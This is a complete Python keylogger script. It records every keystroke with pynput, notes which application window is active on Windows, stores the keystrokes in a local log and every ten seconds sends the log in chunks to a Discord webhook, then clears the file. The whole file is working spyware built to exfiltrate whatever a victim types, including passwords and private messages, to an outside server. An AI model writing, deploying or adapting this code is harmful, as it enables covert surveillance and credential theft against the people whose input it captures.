import os
import time
import threading
import requests
from pynput import keyboard
from datetime import datetime

# ===========================
# LOAD DISCORD WEBHOOK
# ===========================
if os.path.exists("config.txt"):
    with open("config.txt", "r") as f:
        DISCORD_WEBHOOK = f.read().strip()
else:
    print("[!] No config.txt found. Please run setup_client_discord.bat first.")
    exit(1)

SEND_INTERVAL = 10  # seconds
LOG_DIR = "logs"
LOG_FILE = os.path.join(LOG_DIR, "keystrokes.log")

os.makedirs(LOG_DIR, exist_ok=True)
current_window = None
buffer_lock = threading.Lock()
keystroke_buffer = []

# ===========================
# FUNCTIONS
# ===========================
def send_to_discord(message):
    """Send text to Discord webhook."""
    try:
        payload = {"content": message}
        requests.post(DISCORD_WEBHOOK, json=payload)
    except Exception as e:
        print(f"[!] Failed to send to Discord: {e}")

def get_active_window():
    try:
        import platform, psutil
        if platform.system() == "Windows":
            import ctypes, win32gui
            hwnd = win32gui.GetForegroundWindow()
            pid = ctypes.c_ulong()
            ctypes.windll.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
            proc = psutil.Process(pid.value)
            return proc.name()
    except Exception:
        return "unknown_app"

def write_buffer_to_file():
    global keystroke_buffer
    with buffer_lock:
        if keystroke_buffer:
            with open(LOG_FILE, "a", encoding="utf-8") as f:
                f.writelines(keystroke_buffer)
            keystroke_buffer = []

def on_press(key):
    global current_window
    new_window = get_active_window()
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    with buffer_lock:
        if new_window != current_window:
            current_window = new_window
            keystroke_buffer.append(f"\n[{timestamp}] Active Window: {current_window}\n")
        if hasattr(key, 'char') and key.char:
            keystroke_buffer.append(key.char)
        else:
            keystroke_buffer.append(f' [{key}] ')
    if len(keystroke_buffer) >= 50:
        write_buffer_to_file()

def send_logs():
    while True:
        try:
            write_buffer_to_file()
            if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > 0:
                with open(LOG_FILE, "r", encoding="utf-8") as f:
                    data = f.read()

                # Send in chunks (Discord limit ~2000 chars)
                for i in range(0, len(data), 1900):
                    send_to_discord(data[i:i+1900])

                open(LOG_FILE, "w").close()  # Clear log
                print("[+] Sent logs to Discord")
        except Exception as e:
            print(f"[!] Send error: {e}")
        time.sleep(SEND_INTERVAL)

# ===========================
# MAIN
# ===========================
if __name__ == "__main__":
    threading.Thread(target=send_logs, daemon=True).start()
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
